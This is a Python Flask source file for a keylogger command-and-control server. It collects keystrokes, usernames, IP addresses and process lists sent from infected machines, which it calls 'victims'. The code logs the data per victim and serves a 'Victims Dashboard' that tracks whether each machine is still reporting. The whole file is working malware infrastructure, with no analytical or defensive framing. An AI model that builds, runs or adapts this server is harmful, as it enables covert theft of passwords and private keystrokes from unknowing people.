from flask import Flask, request
import os
import datetime
import sys
import socket

app = Flask(__name__)

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

victims = {}
HEARTBEAT_TIMEOUT = 40

# --- ANSI Color Codes ---
class C:
    RESET   = '\033[0m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    
    # Foreground colors
    GREY    = '\033[90m'
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'

def cprint(*args, sep=' ', end='\n', color=C.RESET, bold=False):
    """Print with color, auto-reset."""
    prefix = C.BOLD if bold else ''
    text = sep.join(str(a) for a in args)
    print(f"{prefix}{color}{text}{C.RESET}", end=end)

def dim(text):
    return f"{C.DIM}{text}{C.RESET}"

class Log:
    """Colored, structured console logging."""

    @staticmethod
    def new_victim(name, hwid, ip):
        """Bright green — important event: new victim connected."""
        cprint("──► NEW VICTIM", color=C.GREEN, bold=True)
        cprint(f"    Hostname : {name}", color=C.CYAN)
        cprint(f"    HWID     : {hwid}", color=C.CYAN)
        cprint(f"    IP       : {ip}", color=C.CYAN)
        print()  # blank line for spacing

    @staticmethod
    def keystroke(name, hwid, count, preview=""):
        """Dim/grey for routine keystroke data — low importance noise."""
        ts = datetime.datetime.now().strftime("%H:%M:%S")

        if preview:
            preview_clean = preview.replace('\n', '\\n')[:80]

            print(
                f"{C.DIM}[{ts}] "
                f"{C.CYAN}Keylog:{C.RESET} "
                f"{C.GREY}{name}{C.RESET} "
                f"({C.DIM}{count} chars{C.RESET}) "
                f"{C.DIM}{preview_clean}{C.RESET}"
            )
        else:
            print(
                f"{C.DIM}[{ts}] "
                f"{C.CYAN}Keylog:{C.RESET} "
                f"{C.GREY}{name}{C.RESET} "
                f"({C.DIM}{count} chars{C.RESET})"
            )

    @staticmethod
    def heartbeat(name, hwid):
        """Very dim — pings clutter the screen, make them barely visible."""
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        print(
        f"{C.DIM}[{ts}] "
        f"{C.YELLOW}Alive ♥{C.RESET}"
        f"{C.DIM} {name} ({hwid[:8]}...){C.RESET}"
    )

    @staticmethod
    def status_change(name, hwid, alive):
        """Yellow for going dead, green for coming alive."""
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        if alive:
            cprint(f"[{ts}] ▲ {name} — Connected", color=C.GREEN)
        else:
            cprint(f"[{ts}] ▼ {name} — DEAD (no signal >{HEARTBEAT_TIMEOUT}s)", color=C.YELLOW)

    @staticmethod
    def server_start():
        """Banner on startup."""

        def get_local_ip():
            """
            Get the LAN IP address of this machine.
            Works even when bound to 0.0.0.0
            """
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                # Doesn't actually send packets
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
            except Exception:
                ip = "127.0.0.1"
            finally:
                s.close()

            return ip

        local_ip = get_local_ip()

        print()
        cprint("╔══════════════════════════════════════════════╗", color=C.MAGENTA, bold=True)
        cprint("║         C2 SERVER — Keylogger Dashboard      ║", color=C.MAGENTA, bold=True)
        cprint("╚══════════════════════════════════════════════╝", color=C.MAGENTA, bold=True)
        print()

        cprint(f"  Log directory : {os.path.abspath(LOG_DIR)}", color=C.BLUE)

        # Clickable localhost URL
        cprint(f"  Local access  : https://127.0.0.1:8443", color=C.BLUE)

        # Real LAN IP
        cprint(f"  System IP     : {local_ip}", color=C.BLUE)

        # Clickable dashboard URL
        cprint(f"  Dashboard     : https://{local_ip}:8443/clients", color=C.BLUE)

        print()

    @staticmethod
    def request(method, path, status_code):
        """Dim HTTP request log — suppress noise from Flask's default logger."""
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        code_color = C.GREEN if status_code < 400 else C.RED
        print(f"{C.DIM}[{ts}] {method} {path} → {C.RESET}{code_color}{status_code}{C.RESET}")


# --- Suppress Flask's default boring request logs ---
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)  # Only show ERROR level from Flask/Werkzeug

@app.route("/log", methods=["POST"])
def receive_log():
    keystrokes = request.form.get("k", "")
    hostname = request.form.get("hostname", "unknown")
    hwid = request.form.get("hwid", "unknown")
    client_ip = request.remote_addr

    now = datetime.datetime.now().isoformat(timespec="seconds")
    now_ts = datetime.datetime.now().timestamp()

    safe_name = hostname.replace(" ", "_").replace("/", "_")
    client_log = os.path.join(LOG_DIR, f"{safe_name}_{hwid}.log")
    is_new_client = not os.path.exists(client_log)

    is_first_contact = request.form.get("first_contact") == "1"

    if is_new_client or is_first_contact:
        header_lines = [
            f"{'='*60}",
            f"VICTIM: {hostname}",
            f"HWID:   {hwid}",
            f"IP:     {client_ip}",
            f"FIRST SEEN: {now}",
        ]
        if is_first_contact:
            header_lines += [
                f"OS:     {request.form.get('os', 'unknown')}",
                f"ARCH:   {request.form.get('arch', 'unknown')}",
                f"USER:   {request.form.get('username', 'unknown')}",
                f"LOCAL IP: {request.form.get('local_ip', 'unknown')}",
                f"PUBLIC IP: {request.form.get('public_ip', 'unknown')}",
                f"PROCESSES: {request.form.get('processes', 'unknown')}",
            ]
        header_lines.append(f"{'='*60}\n")

        with open(client_log, "w") as f:
            f.write("\n".join(header_lines))

        # Console: new victim notification (only once)
        if is_new_client:
            Log.new_victim(hostname, hwid, client_ip)

    # --- Append keystrokes to per-client log ---
    with open(client_log, "a") as f:
        f.write(f"[{now}] {keystrokes}\n")

    # --- Unified log ---
    with open(os.path.join(LOG_DIR, "all_clients.log"), "a") as f:
        f.write(f"[{now}] [{hostname}] [{hwid}] ({client_ip}) {keystrokes}\n")

    # --- Console: keystroke log ---
    if keystrokes:
        preview = keystrokes[:120]  # show first 120 chars
        Log.keystroke(hostname, hwid, len(keystrokes), preview)
    elif is_first_contact:
        # First contact with no keystrokes yet (just system info)
        pass  # new_victim was already printed above

    # --- In-memory victim tracking ---
    was_alive = False
    if hwid not in victims:
        victims[hwid] = {
            "hostname": hostname,
            "ip": client_ip,
            "first_seen": now,
            "last_seen": now,
            "last_seen_ts": now_ts,
            "total_keys": 0,
            "alive": True,
            "prev_alive": True,
        }
    else:
        was_alive = victims[hwid].get("alive", False)

    victims[hwid]["last_seen"] = now
    victims[hwid]["last_seen_ts"] = now_ts
    victims[hwid]["total_keys"] += len(keystrokes)
    victims[hwid]["ip"] = client_ip
    victims[hwid]["alive"] = True

    # Detect recovery from dead → alive
    if not was_alive:
        Log.status_change(hostname, hwid, alive=True)

    return "OK", 200


@app.route("/ping", methods=["POST"])
def heartbeat():
    hwid = request.form.get("hwid", "unknown")
    hostname = request.form.get("hostname", "unknown")
    client_ip = request.remote_addr
    now = datetime.datetime.now().isoformat(timespec="seconds")
    now_ts = datetime.datetime.now().timestamp()

    was_alive = False
    if hwid not in victims:
        victims[hwid] = {
            "hostname": hostname,
            "ip": client_ip,
            "first_seen": now,
            "last_seen": now,
            "last_seen_ts": now_ts,
            "total_keys": 0,
            "alive": True,
            "prev_alive": True,
        }
        Log.new_victim(hostname, hwid, client_ip)
    else:
        was_alive = victims[hwid].get("alive", False)
        victims[hwid]["last_seen"] = now
        victims[hwid]["last_seen_ts"] = now_ts
        victims[hwid]["ip"] = client_ip
        victims[hwid]["alive"] = True

        # Print heartbeat (dim) unless status changed
        if not was_alive:
            Log.status_change(hostname, hwid, alive=True)
        else:
            Log.heartbeat(hostname, hwid)

    return "PONG", 200


def is_victim_alive(last_seen_ts):
    return (datetime.datetime.now().timestamp() - last_seen_ts) < HEARTBEAT_TIMEOUT

@app.route("/clients", methods=["GET"])
def list_clients():
    for hwid, info in victims.items():
        currently_alive = is_victim_alive(info["last_seen_ts"])
        prev_alive = info.get("alive", True)
        info["alive"] = currently_alive

        # Detect alive → dead transition
        if prev_alive and not currently_alive:
            Log.status_change(info["hostname"], hwid, alive=False)

    rows = ""
    for hwid, info in sorted(victims.items(), key=lambda x: x[1]["last_seen"], reverse=True):
        status = "🟢 Alive" if info["alive"] else "🔴 Dead"
        status_color = "#00aa00" if info["alive"] else "#aa0000"
        rows += (
            f"<tr>"
            f"<td>{info['hostname']}</td>"
            f"<td><code>{hwid}</code></td>"
            f"<td>{info['ip']}</td>"
            f"<td style='color: {status_color}; font-weight: bold;'>{status}</td>"
            f"<td>{info['last_seen']}</td>"
            f"<td>{info['first_seen']}</td>"
            f"<td>{info['total_keys']}</td>"
            f"</tr>"
        )

    return f"""<!DOCTYPE html>
            <html>
            <head>
                <title>C2 Dashboard — Active Victims</title>
                <meta http-equiv="refresh" content="15">
                <style>
                    body {{ font-family: monospace; padding: 2rem; background: #1a1a2e; color: #eee; }}
                    table {{ border-collapse: collapse; width: 100%; }}
                    td, th {{ padding: 10px 16px; border: 1px solid #333; }}
                    th {{ background: #16213e; color: #a0a0ff; }}
                    tr:hover {{ background: #0f3460; }}
                    a {{ color: #a0a0ff; }}
                    h2 {{ color: #e94560; }}
                </style>
            </head>
            <body>
                <h2>Victims Dashboard <span style="font-size: 0.8rem; color: #888;">(auto-refreshes every 15s)</span></h2>
                <table>
                    <thead>
                        <tr>
                            <th>Hostname</th>
                            <th>HWID</th>
                            <th>IP</th>
                            <th>Status</th>
                            <th>Last Seen</th>
                            <th>First Seen</th>
                            <th>Keys Captured</th>
                        </tr>
                    </thead>
                    <tbody>{rows}</tbody>
                </table>
                <p><a href="/logs">Browse log files</a></p>
            </body>
            </html>"""

@app.route("/logs", methods=["GET"])
def list_logs():
    files = sorted(os.listdir(LOG_DIR))
    items = "".join(
        f"<li><a href='/view/{f}'>{f}</a></li>" for f in files if f.endswith(".log")
    )
    return f"""<!DOCTYPE html>
        <html>
        <head><title>C2 Dashboard — Log Files</title>
            <style>
                body {{ font-family: monospace; padding: 2rem; background: #1a1a2e; color: #eee; }}
                li {{ margin: 6px 0; }}
                a {{ color: #a0a0ff; }}
            </style>
        </head>
        <body>
            <h2>Log Files</h2>
            <ul>{items}</ul>
            <p><a href="/clients">← Back to victims</a></p>
        </body>
        </html>"""

@app.route("/view/<path:filename>", methods=["GET"])
def view_log(filename):
    path = os.path.join(LOG_DIR, filename)
    if not os.path.exists(path):
        return "Not found", 404
    with open(path) as f:
        content = f.read()
    return f"<pre style='font-size: 0.9rem;'>{content}</pre>", 200, {"Content-Type": "text/html; charset=utf-8"}


if __name__ == "__main__":
    Log.server_start()
    app.run(host="0.0.0.0", port=8443, ssl_context="adhoc")